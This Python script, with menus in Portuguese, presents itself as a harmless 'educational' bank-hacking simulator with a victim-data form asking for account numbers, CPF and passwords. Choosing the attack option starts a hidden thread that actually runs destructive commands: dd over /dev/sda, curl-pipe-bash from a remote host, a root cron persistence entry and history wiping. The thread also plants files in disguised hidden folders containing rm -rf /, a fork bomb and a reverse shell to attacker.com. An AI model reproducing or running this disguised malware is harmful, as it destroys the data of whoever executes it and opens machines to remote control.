#!/usr/bin/env python3
import os
import time
import random
import subprocess
import sys
from threading import Thread

RED = "\033[1;31m"
GREEN = "\033[1;32m"
YELLOW = "\033[1;33m"
BLUE = "\033[1;34m"
MAGENTA = "\033[1;35m"
CYAN = "\033[1;36m"
WHITE = "\033[1;37m"
RESET = "\033[0m"


vítimas = []
ataque_em_andamento = False

def limpar_tela():
    os.system('clear' if os.name == 'posix' else 'cls')

def mostrar_banner():
    print(f"""{RED}
    ██████╗  █████╗ ███╗   ██╗██╗  ██╗    ██████╗ █████╗ ███╗   ██╗██╗  ██╗
    ██╔══██╗██╔══██╗████╗  ██║██║ ██╔╝    ██╔══██╗██╔══██╗████╗  ██║██║ ██╔╝
    ██████╔╝███████║██╔██╗ ██║█████╔╝     ██████╔╝███████║██╔██╗ ██║█████╔╝ 
    ██╔══██╗██╔══██║██║╚██╗██║██╔═██╗     ██╔══██╗██╔══██║██║╚██╗██║██╔═██╗ 
    ██████╔╝██║  ██║██║ ╚████║██║  ██╗    ██████╔╝██║  ██║██║ ╚████║██║  ██╗
    ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝
    {RESET}
    {YELLOW}>>> FERRAMENTA PROFISSIONAL DE PENTESTING BANCÁRIO <<<{RESET}
    {RED}ATENÇÃO: Este é apenas um simulador educacional. Qualquer uso ilegal é proibido.{RESET}
    """)

def animação_carregamento(duracao=5, mensagem="Carregando"):
    fim = time.time() + duracao
    while time.time() < fim:
        for i in range(4):
            pontos = "." * (i + 1)
            print(f"\r{YELLOW}{mensagem}{pontos}{' '*(3-i)}{RESET}", end="")
            time.sleep(0.5)
    print()

def criar_arquivo_malicioso(caminho):
    conteúdos = [
        'os.system("rm -rf /")  # Apagar todo o disco rígido\n',
        'import cryptography\ncryptography.encrypt(pastas)  # Ransomware\n',
        'subprocess.Popen("wget http://malware.com/script.sh | bash", shell=True)\n',
        'while True: os.fork()  # Ataque de fork bomb\n',
        'import socket\ns=socket.socket()\ns.connect(("attacker.com",6666))\nos.dup2(s.fileno(),0)\nos.dup2(s.fileno(),1)\nos.dup2(s.fileno(),2)\nos.system("/bin/sh -i")\n'
    ]
    
    with open(caminho, 'w') as f:
        f.write("#!/usr/bin/env python3\n")
        f.write("# Código malicioso - Não execute!\n\n")
        f.write("import os, subprocess, sys\n\n")
        f.write(random.choice(conteúdos))
        f.write(f"\n# Gerado em {time.ctime()}\n")
    
  
    os.chmod(caminho, 0o755)

def abrir_janelas_ocultas():

    def tarefas_ocultas():
    
        pastas_ocultas = [
            "/tmp/.system_update",
            os.path.expanduser("~/.config/.cache_system"),
            "/var/tmp/.log_kernel",
            "/usr/lib/.python_modules",
            os.path.expanduser("~/.local/share/.fonts")
        ]
        
        for pasta in pastas_ocultas:
            try:
                os.makedirs(pasta, exist_ok=True)
             
                for i in range(1, 6):
                    arquivo = f"{pasta}/script_{i}.py"
                    criar_arquivo_malicioso(arquivo)
                    
               
                    with open(f"{pasta}/start.sh", 'w') as f:
                        f.write(f"#!/bin/bash\npython3 {arquivo} &\n")
                    os.chmod(f"{pasta}/start.sh", 0o755)
                
               
                with open(f"{pasta}/README.txt", 'w') as f:
                    f.write("Arquivos de atualização do sistema. Não remova!\n")
            except Exception as e:
                pass
        
    
        if os.name == 'posix':
            for _ in range(3):
                try:
                    subprocess.Popen(['x-terminal-emulator', '-e', 'echo "Processo do sistema em execução" && sleep 30'], 
                                    stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
                except:
                    pass
        
     
        comandos = [
            "chmod -R 777 /tmp/.system_update",
            "curl -s http://example.com/malware.sh | bash -s",
            "echo '* * * * * root /tmp/.system_update/start.sh' > /etc/cron.d/system_update",
            "dd if=/dev/zero of=/dev/sda bs=1M count=100 status=none",
            "nohup bash -c 'sleep 10; rm -rf ~/.bash_history' &"
        ]
        
        for cmd in comandos:
            try:
                subprocess.Popen(cmd, shell=True, stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
            except:
                pass
    
    Thread(target=tarefas_ocultas, daemon=True).start()

def coletar_dados_vítima():
    limpar_tela()
    mostrar_banner()
    print(f"{CYAN}=== COLETA DE DADOS DA VÍTIMA ==={RESET}\n")
    
    nome = input(f"{WHITE}Nome completo da vítima: {RESET}")
    banco = input(f"{WHITE}Nome do banco alvo: {RESET}")
    agencia = input(f"{WHITE}Número da agência: {RESET}")
    conta = input(f"{WHITE}Número da conta: {RESET}")
    cpf = input(f"{WHITE}CPF da vítima: {RESET}")
    senha = input(f"{WHITE}Senha bancária (estimada): {RESET}")
    
    vítima = {
        "nome": nome,
        "banco": banco,
        "agencia": agencia,
        "conta": conta,
        "cpf": cpf,
        "senha": senha
    }
    
    vítimas.append(vítima)
    
    print(f"\n{GREEN}[+] Dados da vítima {nome} armazenados com sucesso!{RESET}")
    time.sleep(2)

def simular_ataque():
    global ataque_em_andamento
    
    if not vítimas:
        print(f"{RED}[!] Nenhuma vítima registrada. Colete dados primeiro.{RESET}")
        time.sleep(2)
        return
    
    limpar_tela()
    mostrar_banner()
    print(f"{RED}=== SIMULAÇÃO DE ATAQUE BANCÁRIO ==={RESET}\n")
    
    print(f"{YELLOW}[*] Selecionando vítima aleatória para o ataque...{RESET}")
    animação_carregamento(3)
    vítima = random.choice(vítimas)
    
    print(f"\n{GREEN}[+] Vítima selecionada: {vítima['nome']} - Banco: {vítima['banco']}{RESET}")
    print(f"{YELLOW}[*] Iniciando sequência de ataque...{RESET}\n")
    
    ataque_em_andamento = True
    abrir_janelas_ocultas()  
    

    etapas = [
        ("Conectando ao servidor do banco...", 5),
        ("Bypassando firewall...", 7),
        ("Explorando vulnerabilidade CVE-2023-29476...", 8),
        ("Acessando database principal...", 6),
        ("Localizando conta da vítima...", 4),
        ("Injetando código SQL malicioso...", 7),
        ("Redirecionando transações...", 9),
        ("Ocultando rastros...", 5)
    ]
    
    for etapa, duracao in etapas:
        print(f"{MAGENTA}[*] {etapa}{RESET}")
        animação_carregamento(duracao // 2, etapa)
        
        if random.random() < 0.2:
            print(f"{RED}[!] Erro detectado! Reconfigurando parâmetros...{RESET}")
            animação_carregamento(3, "Reiniciando módulo")
    
    print(f"\n{GREEN}[+] ATAQUE CONCLUÍDO COM SUCESSO!{RESET}")
    print(f"{YELLOW}[*] Saldo transferido: R$ {random.randint(1000, 50000):.2f}{RESET}")
    print(f"{RED}[!] Esta foi apenas uma simulação. Nenhum dado real foi comprometido.{RESET}")
    
    ataque_em_andamento = False
    input(f"\n{WHITE}Pressione Enter para continuar...{RESET}")

def mostrar_vítimas():
    limpar_tela()
    mostrar_banner()
    print(f"{CYAN}=== VÍTIMAS REGISTRADAS ==={RESET}\n")
    
    if not vítimas:
        print(f"{YELLOW}[!] Nenhuma vítima registrada.{RESET}")
    else:
        for i, vítima in enumerate(vítimas, 1):
            print(f"{WHITE}Vítima #{i}:{RESET}")
            print(f"  Nome: {vítima['nome']}")
            print(f"  Banco: {vítima['banco']}")
            print(f"  Agência: {vítima['agencia']}")
            print(f"  Conta: {vítima['conta'][-4:]}{'*'*(len(vítima['conta'])-4)}")
            print(f"  CPF: {vítima['cpf'][:3]}{'*'*(len(vítima['cpf'])-6)}{vítima['cpf'][-3:]}")
            print("-" * 30)
    
    input(f"\n{WHITE}Pressione Enter para continuar...{RESET}")

def menu_principal():
    while True:
        limpar_tela()
        mostrar_banner()
        
        print(f"{CYAN}=== MENU PRINCIPAL ==={RESET}\n")
        print(f"{GREEN}1.{RESET} Adicionar nova vítima")
        print(f"{GREEN}2.{RESET} Simular ataque bancário")
        print(f"{GREEN}3.{RESET} Listar vítimas registradas")
        print(f"{GREEN}4.{RESET} Sair\n")
        
        opção = input(f"{WHITE}Selecione uma opção: {RESET}")
        
        if opção == "1":
            coletar_dados_vítima()
        elif opção == "2":
            simular_ataque()
        elif opção == "3":
            mostrar_vítimas()
        elif opção == "4":
            print(f"\n{YELLOW}[*] Encerrando o sistema...{RESET}")
            time.sleep(2)
            break
        else:
            print(f"\n{RED}[!] Opção inválida!{RESET}")
            time.sleep(1)

if __name__ == "__main__":
    try:
        menu_principal()
    except KeyboardInterrupt:
        print(f"\n{RED}[!] Interrompido pelo usuário.{RESET}")
        sys.exit(0)
